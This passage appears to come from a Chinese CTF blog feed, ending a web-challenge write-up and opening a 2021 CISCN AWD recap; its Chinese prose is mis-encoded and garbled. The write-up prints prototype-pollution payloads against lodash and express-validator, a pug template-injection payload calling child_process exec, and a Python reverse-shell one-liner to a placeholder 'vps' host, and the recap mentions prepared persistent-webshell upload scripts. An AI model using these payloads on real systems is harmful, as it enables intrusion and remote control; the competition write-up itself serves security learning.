¹æœ¬ä¸æƒ³è®©æˆ‘ä»¬ç™»é™†è·å¾—adminï¼Œä¹Ÿä¸å¯èƒ½ç™»é™†adminã€‚æ‰€ä»¥å¾—å¦æƒ³æ–¹æ³•ï¼Œæˆ‘ä»¬çš„å…³é”®ç‚¹å°±åœ¨äºè®©<code>isadmin</code>ä¸æ˜¯notadminï¼Œè€Œ<code>isadmin</code>åˆæ˜¯åœ¨<code>/verify</code>è·¯ç”±ä¸‹æ‰åˆ›å»ºçš„ï¼Œå¦‚æœæ”¹å˜åŸå‹å¯¹è±¡çš„å†…å®¹è®©<code>isadmin</code>æå‰åˆ›å»ºï¼Œè¿™æ ·å°±è¾¾åˆ°äº†æ±¡æŸ“ï¼Œä»è€Œè®©<code>isadmin</code>å˜ä¸ºénotadmin</p><p>å›¾ä¸º <a href="www.mrkaixin.top">@Mrkaixin</a> å¸ˆå‚…ç»™å‡ºçš„sessionæ ·å­</p><img src="/article/2021dfjk/image-20210803144614812.png" class="" title="image-20210803144614812" loading="lazy"><h3 id="ç¬¬ä¸‰æ­¥-åŸå‹é“¾æ±¡æŸ“"><a href="#ç¬¬ä¸‰æ­¥-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ç¬¬ä¸‰æ­¥ - åŸå‹é“¾æ±¡æŸ“"></a>ç¬¬ä¸‰æ­¥ - åŸå‹é“¾æ±¡æŸ“</h3><p>æ ¹æ®è¯»åˆ°çš„packageåŒ…å¼•ç”¨ï¼Œå‘ç°lodashç‰ˆæœ¬ä¸º4.17.15ã€‚lodash&lt;4.17.17æ˜¯æœ‰åŸå‹é“¾æ±¡æŸ“æ¼æ´çš„</p><img src="/article/2021dfjk/E34B2280959DFF59059010F95FFB5E8C.png" class="" title="E34B2280959DFF59059010F95FFB5E8C" loading="lazy"><p>è¿™é‡Œç»™å‡º<a href="https://paper.seebug.org/1426/">å‚è€ƒæ–‡ç« </a>å¼•ç”¨éƒ¨åˆ†ï¼Œå†™çš„å¾ˆè¯¦ç»†ï¼Œå‚è€ƒæ–‡ç« åœ¨æ–‡æœ«</p><blockquote><p>æµ‹è¯•æ•°æ®åŒ…ï¼š</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__[test]"</span><span class="token operator">:</span> <span class="token string">"123 "</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™é‡Œåœ¨segments.reduceå‡½æ•°ä¸­å¯¹è¾“å…¥çš„å€¼è¿›è¡Œäº†ä¸€äº›åˆ¤æ–­å’Œæ›¿æ¢ã€‚é‡è¦çš„ç‚¹å°±æ˜¯å½“ä¼ å…¥çš„é”®ä¸­å­˜åœ¨<code>.</code> ï¼Œåˆ™ä¼šåœ¨å­—ç¬¦ä¸¤è¾¹åŠ ä¸Š<code>[&quot; &quot;]</code>ï¼Œå¹¶ä¸”æœ€ç»ˆè¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„ç»“æœã€‚</p><p>æ¥ç€ä¹‹å‰çš„è¿‡ç¨‹ï¼Œåœ¨ç»è¿‡äº†è¿‡æ»¤å™¨çš„å¤„ç†ä¹‹åï¼Œä¼šé€šè¿‡lodash.setå¯¹æŒ‡å®šçš„pathè®¾ç½®æ–°å€¼</p><img src="/article/2021dfjk/1607915420000-16044095450346.jpg-w331s" class="" title="-w1160" loading="lazy"><p>å°è¯•æ±¡æŸ“<strong>proto</strong>[test]ï¼Œç»“æœå‘ç°æ˜¯æ±¡æŸ“å¹¶æ²¡æœ‰æˆåŠŸï¼ŒåŸå› æ˜¯å› ä¸ºï¼Œå½“lodash.setä¸­ç¬¬ä¸€ä¸ªå‚æ•°å­˜åœ¨ä¸€ä¸ªä¸ç¬¬äºŒä¸ªå‚æ•°åŒåçš„é”®æ—¶ï¼Œæ±¡æŸ“å°±ä¼šå¤±è´¥</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å°±è¦å°è¯•å»ç»•è¿‡è¿™ä¸ªç‚¹ã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè¯­å¥ï¼š</p><pre class="language-none"><code class="language-none">path !&#x3D;&#x3D; &#39;&#39; ? _.set(req[location], path, newValue) : _.set(req, location, newValue);</code></pre><p>è¿™é‡Œçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä»è¯·æ±‚ä¸­ç›´æ¥å–å‡ºæ¥çš„ï¼Œpathæ˜¯ç»è¿‡å…ˆå‰å¤„ç†åçš„å‡ºæ¥çš„å€¼ã€‚æ‰€ä»¥èƒ½ä¸èƒ½é€šè¿‡è¿™ä¸ªå¤„ç†æ¥è¿›è¡Œç»•è¿‡å‘¢ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ã€‚ å½“æˆ‘ä»¬ä¼ å…¥ï¼š</p><pre class="language-none"><code class="language-none">&#123;&quot;\&quot;].__proto__[\&quot;test&quot;:&quot;123 &quot;&#125;</code></pre><p>è¿™é‡Œçš„é”®ä¸º<code>&quot;].__proto__[&quot;test</code>ï¼Œç”±äºå­—ç¬¦é‡Œé¢å­˜åœ¨<code>.</code>ï¼Œæ‰€ä»¥åœ¨segments.reduceå‡½æ•°å¤„ç†æ—¶ä¼šå¯¹å…¶å·¦å³åŠ åŒå¼•å·å’Œä¸­æ‹¬å·ï¼Œæœ€ç»ˆå˜æˆï¼š<code>[&quot;&quot;].__proto__[&quot;test&quot;]</code>ã€‚</p><p>è¿™æ—¶å°±ä¸å­˜åœ¨åŒåçš„é”®äº†ï¼Œäºæ˜¯æŸ¥çœ‹æ±¡æŸ“çš„åçš„å€¼å‘ç°ï¼š</p><img src="/article/2021dfjk/1607915421000-16044107085533.jpg-w331s" class="" title="-w426" loading="lazy"><p>æˆ‘ä»¬è®¾ç½®çš„å€¼å¹¶æ²¡æœ‰ä¼ é€’è¿›å»ï¼Œè€Œæ˜¯æ±¡æŸ“ä¸ºäº†ä¸€ä¸ªç©ºå€¼ã€‚ä¸ºä»€ä¹ˆä¼ é€’è¿›æ¥çš„newValueä¸ºç©ºå€¼å‘¢ï¼Ÿ</p><p>ä»select-fields.jsä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯å› ä¸ºå–å€¼æ—¶ï¼Œä½¿ç”¨çš„æ˜¯lodash.getæ–¹æ³•ä»<code>req[&#39;body&#39;]</code>ä¸­å–è¢«å¤„ç†åçš„é”®å€¼ï¼Œå¤„ç†åçš„é”®æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥å–å‡ºæ¥çš„å€¼å°±ä¸ºundefinedã€‚å½“undefinedä¼ é€’åˆ°Sanitization.runæ–¹æ³•ä¸­åï¼Œç»è¿‡äº†ä¸€ä¸ª<code>.toString()</code>çš„å¤„ç†å˜æˆäº†<code>&#39;&#39;</code>ç©ºå­—ç¬¦ä¸²ã€‚</p><p>åˆ©ç”¨lodash.getæ–¹æ³•ä¸­è¯»å–é”®å€¼çš„å¦™ç”¨å¾—åˆ°æœ€ç»ˆçš„payloadï¼š</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"a"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"testvalue"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token property">"a\"].__proto__[\"test"</span><span class="token operator">:</span> <span class="token number">222</span><span class="token punctuation">&#125;</span></code></pre><p>è¯¦ç»†å¯åœ¨å‚è€ƒæ–‡ç« ä¸­æŸ¥çœ‹</p></blockquote><p>äºæ˜¯è¿›è¡Œæµ‹è¯•</p><p>æµ‹è¯•ä»£ç </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">9001</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    extended<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span>    body<span class="token punctuation">,</span>    validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span>middlewares <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>middlewares<span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/user"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token string">"hellowrold"</span>    <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>    <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">server listening on </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>lod <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span>lod<span class="token punctuation">.</span><span class="token function">setWith</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"__proto__[isadmin]"</span><span class="token punctuation">,</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span></code></pre><p>æ ¹æ®åŸpayloadï¼Œå¯ä»¥å‘ç°ï¼Œè¿™é‡Œç”¨jsonæ ¼å¼postçš„è¯·æ±‚æˆåŠŸè¾¾åˆ°äº†ç›®çš„ï¼Œå¹¶ä¸”è¿˜èƒ½è¿›è¡Œè¦†ç›–</p><img src="/article/2021dfjk/image-20210803151756631.png" class="" title="image-20210803151756631" loading="lazy"><p>ä½†æ˜¯é—®é¢˜åœ¨äºé¢˜ç›®æ˜¯ä¸è§£æjsonè¯·æ±‚çš„ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼æ„é€ åŸå‹é“¾æ±¡æŸ“</p><img src="/article/2021dfjk/image-20210803152057397.png" class="" title="image-20210803152057397" loading="lazy"><p>åæ€ï¼šæ¯”èµ›ä¸­ç”±äºæœªä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¯¼è‡´ä»¥ä¸ºå¿…é¡»è¦è¦†ç›–ä¸ºadminæ‰è¡Œï¼Œé”™å¤±äº†å¤§é‡æ—¶é—´ï¼Œå…¶å®åªè¦æ˜¯énotadminå°±è¡Œ</p><p>æœ€ç»ˆæµ‹è¯•å¦‚ä¸‹</p><img src="/article/2021dfjk/image-20210803151332184.png" class="" title="image-20210803151332184" loading="lazy"><p>Payload:<code>&quot;.constructor.prototype[&quot;xxx</code> </p><p>åˆ©ç”¨è¿™æ ·çš„æ„é€ å™¨å»è¾¾åˆ°è¦†ç›–<code>xxx</code>çš„ç›®çš„ï¼Œ<code>.__proto__.</code> è¿™æ ·æ˜¯ä¸è¡Œçš„</p><img src="/article/2021dfjk/image-20210803152912326.png" class="" title="image-20210803152912326" loading="lazy"><p>åŸå‹é“¾æ±¡æŸ“æˆåŠŸ</p><img src="/article/2021dfjk/image-20210803152818280.png" class="" title="image-20210803152818280" loading="lazy"><h3 id="ç¬¬å››æ­¥-å‘½ä»¤æ‰§è¡Œ"><a href="#ç¬¬å››æ­¥-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ç¬¬å››æ­¥ - å‘½ä»¤æ‰§è¡Œ"></a>ç¬¬å››æ­¥ - å‘½ä»¤æ‰§è¡Œ</h3><p>ç»§ç»­çœ‹ä»£ç ï¼Œå‘ç°<code>session.debug</code>åå°†<code>query</code>è¯·æ±‚çš„<code>p</code>èµ‹åˆ°äº†<code>info.pretty</code>é‡Œã€‚</p><img src="/article/2021dfjk/image-20210803153247822.png" class="" title="image-20210803153247822" loading="lazy"><hr><p>è¦è¾¾åˆ°pï¼Œé¦–å…ˆè¦è¦†ç›–<code>session.debug</code>ï¼Œæ‰€ä»¥ä¸Šä¸€æ­¥æœ€ç»ˆpayloadä¸º</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span><span class="token number">112222</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">123456</span><span class="token operator">&amp;</span>a<span class="token double-quoted-string string">".constructor.prototype["</span>isadmin<span class="token operator">=</span><span class="token operator">&amp;</span>a<span class="token double-quoted-string string">".constructor.prototype["</span>debug<span class="token operator">=</span></code></pre><hr><p>åˆ©ç”¨æ–‡ä»¶è¯»å–è¯»åˆ°äº†<code>/app/view/admin.pug</code></p><pre class="language-pug" data-language="pug"><code class="language-pug"><span class="token tag">html</span>  <span class="token tag">head</span>    <span class="token tag">title</span><span class="token punctuation">=</span><span class="token code"> title</span>    <span class="token tag">meta<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">http-equiv</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"Content-Type"</span></span><span class="token punctuation">,</span> <span class="token attr-name">content</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text/html;charset=UTF-8"</span></span><span class="token punctuation">)</span></span></span>  <span class="token tag">body</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">hello</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span></span>      <span class="token tag">p</span><span class="token punctuation">=</span><span class="token code"> text</span>      <span class="token tag">div</span> <span class="token plain-text">#&#123;msg&#125;</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>      <span class="token tag">div</span> <span class="token plain-text">ä¸ªæ€§ç­¾åï¼š</span>        <span class="token tag">div</span> <span class="token plain-text">#&#123;diy&#125;</span>        <span class="token tag">div</span> <span class="token plain-text">---#&#123;msg&#125;</span>    <span class="token tag">form<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">action</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">""</span></span><span class="token punctuation">,</span> <span class="token attr-name">method</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"get"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">div</span> <span class="token plain-text">æ›´æ”¹å›¾ç‰‡</span>        <span class="token tag">select<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">name</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"newimg"</span></span><span class="token punctuation">)</span></span></span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/1.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">çº¸é£æœº</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/2.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">äºº</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/3.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">å°ç«è½¦</span>      <span class="token tag">div</span> <span class="token plain-text">ä¸ªæ€§ç­¾å</span>        <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"diy"</span> value<span class="token operator">=</span><span class="token string">"å°Šè´µçš„adminå¯ä»¥åœ¨è¿™æ›´æ”¹ä¸ªæ€§ç­¾å"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"submit"</span></span><span class="token punctuation">)</span></span></span>    <span class="token tag">div</span> <span class="token plain-text">&lt;img src='#&#123;png&#125;'></span>    <span class="token mixin"><span class="token name function">+hello</span><span class="token punctuation">(</span><span class="token string">"å“ˆå–½"</span><span class="token punctuation">)</span></span>    <span class="token mixin"><span class="token name function">+printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></code></pre><p>è€Œpugè¿™é‡Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ŒåŸå› åœ¨pugæ¨¡ç‰ˆå¼•æ“çš„ä¸€ä¸ª<a href="https://github.com/pugjs/pug/issues/3312">issue</a>ä¸­æåˆ°çš„</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>p<span class="token operator">=</span><span class="token single-quoted-string string">');process.mainModule.constructor._load('</span>child_process<span class="token single-quoted-string string">').exec('</span>whoami<span class="token single-quoted-string string">');_=('</span></code></pre><p>åæ€ï¼šexecæ˜¯ä¸å›æ˜¾çš„ï¼ä¸€ç›´è®©æˆ‘ä»¥ä¸ºæ˜¯æˆ‘æ‰“çš„æ–¹å¼ä¸å¯¹â€¦</p><p>æ—¢ç„¶æ²¡å›æ˜¾é‚£è¯•ä¸€ä¸‹å‘ç°æ˜¯é€šå¤–ç½‘çš„ï¼Œå°±å¼¹ä¸ªshellå›æ¥ã€‚è¿™ç®—æ˜¯ä¸ªæ³¨å…¥ï¼Œä¸€æ‰“æ•´ä¸ªç•Œé¢å˜å¾—æƒ¨ä¸å¿ç¹</p><img src="/article/2021dfjk/image-20210803153836972.png" class="" title="image-20210803153836972" loading="lazy"><p>æ™®é€šçš„å¼¹shellå‘½ä»¤ä¼¼ä¹å¹¶ä¸ç®¡ç”¨ï¼Œç›´æ¥å¹²å®ƒ ç”¨pythonå‘½ä»¤å¼¹shell</p><img src="/article/2021dfjk/image-20210803153955025.png" class="" title="image-20210803153955025" loading="lazy"><p>payloadï¼š</p><pre class="language-none"><code class="language-none">.&#x2F;?p&#x3D;&#39;);process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#39;vps\&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&#39;&#x2F;bin&#x2F;bash\&#39;,\&#39;-i\&#39;]);&quot;&#39;);_&#x3D;(&#39;</code></pre><p>æˆåŠŸå¼¹åˆ°shellï¼Œè·å¾—flag</p><img src="/article/2021dfjk/image-20210803154137511.png" class="" title="image-20210803154137511" loading="lazy"><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å·…å³°fwå°±æ˜¯æˆ‘äº†ï¼Œåšé¢˜ç»éªŒè¿˜æ˜¯ä¸è¶³ï¼Œå¯¹äºåŸå‹é“¾æ±¡æŸ“è¿™ä¸€å—çš„çŸ¥è¯†ç»è¿‡è¿™ä¸€æ¬¡æ¯”èµ›çš„æ£€æµ‹å‘ç°è¿˜æ˜¯æœ‰æ‰€æ¬ ç¼ºï¼ŒæŠ“ç´§æ€»ç»“å·©å›ºä¸€ä¸‹jsåŸå‹é“¾æ±¡æŸ“çš„çŸ¥è¯†ç‚¹å§ã€‚</p><hr><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://paper.seebug.org/1426/">Seebug express-validator 6.6.0 åŸå‹é“¾æ±¡æŸ“åˆ†æ</a></p><p><a href="https://github.com/pugjs/pug/issues/3312">pugæ¨¡ç‰ˆå¼•æ“issue</a></p><p><a href="https://www.mrkaixin.top/">@Mrkaixinå¸ˆå‚…</a> éå¸¸æ„Ÿè°¢Mrkaixinå¸ˆå‚…çš„æŒ‡å¯¼</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ·±å…¥å­¦ä¹ ä¸€ä¸‹JavaScriptçš„åŸå‹é“¾æ±¡æŸ“æ¼æ´&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="åŸå‹é“¾æ±¡æŸ“" scheme="https://err0r.top/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>2021ciscnåä¸œåŒ—åŠå†³èµ›</title>
    <link href="https://err0r.top/article/2021ciscnawd/"/>
    <id>https://err0r.top/article/2021ciscnawd/</id>
    <published>2021-06-20T06:34:46.000Z</published>
    <updated>2021-06-26T00:20:51.042Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“æ­£å¼çš„å›½èµ›åŠå†³èµ›awdï¼Œå¤ç›˜æ€»ç»“ï¼Œåˆ†æä¸åæ€</p><a id="more"></a><h2 id="é˜Ÿä¼åç§°ï¼šS3C-2021"><a href="#é˜Ÿä¼åç§°ï¼šS3C-2021" class="headerlink" title="é˜Ÿä¼åç§°ï¼šS3C_2021"></a>é˜Ÿä¼åç§°ï¼šS3C_2021</h2><p>ç¬¬31å</p><p>æ­¢æ­¥äºæ­¤ï¼Œè™½ä¸è£è€€ï¼Œä½†ä»…ä»¥æ­¤é­ç­–è‡ªå·±ã€‚ä¸ºè‡ªå·±ï¼Œä¸ºå›¢é˜Ÿï¼Œä¸ºåç»§çš„å­¦å¼Ÿå­¦å¦¹ä»¬è®°å½•ã€‚</p><p>è‡³æš—æ—¶åˆ»ï¼Œè™½ä¸æ„¿æ‰¿è®¤ï¼Œæœ¬å·¥ä½œå®¤æ‰“å‡ºäº†å†å²è¾‰ç…Œåæœ€å·®çš„ä¸€æ¬¡æˆç»©</p><p>æœ¬äººå¾ˆè‡ªè´£ï¼Œæ²¡èƒ½è·Ÿéšå¸ˆå‚…ä»¬çš„æ­¥ä¼å‰è¿›ï¼Œæ‹–é˜Ÿä¼åè…¿æ­¢æ­¥äºåŠå†³èµ›</p><p>åœ¨æ­¤å¤ç›˜æ€»ç»“</p><hr><h2 id="æ¯”èµ›æ—¶é—´ï¼š2021å¹´6æœˆ19æ—¥-9-00-18-30"><a href="#æ¯”èµ›æ—¶é—´ï¼š2021å¹´6æœˆ19æ—¥-9-00-18-30" class="headerlink" title="æ¯”èµ›æ—¶é—´ï¼š2021å¹´6æœˆ19æ—¥ 9:00-18:30"></a>æ¯”èµ›æ—¶é—´ï¼š2021å¹´6æœˆ19æ—¥ 9:00-18:30</h2><p>æŒ‰ç…§<code>æ—¶é—´ï¼š- äº‹ä»¶</code>æ ¼å¼è¿›è¡Œå®Œæ•´å¤ç›˜ï¼Œä»¥æœ¬äººè§’åº¦å¯¹èµ›å†µè¿›è¡Œåˆ†æ</p><h3 id="æ—¶é—´ï¼šæ¯”èµ›å‰-èµ›å‰å‡†å¤‡"><a href="#æ—¶é—´ï¼šæ¯”èµ›å‰-èµ›å‰å‡†å¤‡" class="headerlink" title="æ—¶é—´ï¼šæ¯”èµ›å‰ - èµ›å‰å‡†å¤‡"></a>æ—¶é—´ï¼šæ¯”èµ›å‰ - èµ›å‰å‡†å¤‡</h3><p>å‡†å¤‡å¥½äº†å®Œå¤‡çš„awdä¸æ­»ç æ‰¹é‡ä¸Šä¼ æ¿€æ´»è„šæœ¬ï¼Œæäº¤flagè„šæœ¬ï¼Œä»¥åŠå„ç±»logæ—¥å¿—åŠåˆ†æå·¥å…·ï¼ŒæŒ‰ç…§å»å¹´æƒ…å†µï¼Œé¢˜ç›®æ˜¯webå¤špwnå°‘ï¼Œå¯¹äºwebåšå¥½äº†å……åˆ†çš„å‡†å¤‡ï¼Œawdå‰æœŸé€Ÿåº¦å–èƒœï¼Œå¦‚æœæœ‰ç®€å•åé—¨å°±å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œè¾¾åˆ°å…¨ç¨‹æ‹¿åˆ†çš„ç›®çš„ã€‚</p><p>æœ¬é˜Ÿä¸‰ä½webå¸ˆå‚…ä¸€ä½pwnå¸ˆå‚…</p><h3 id="æ—¶é—´ï¼šæ¯”èµ›æ—¶-èµ›å†µ"><a 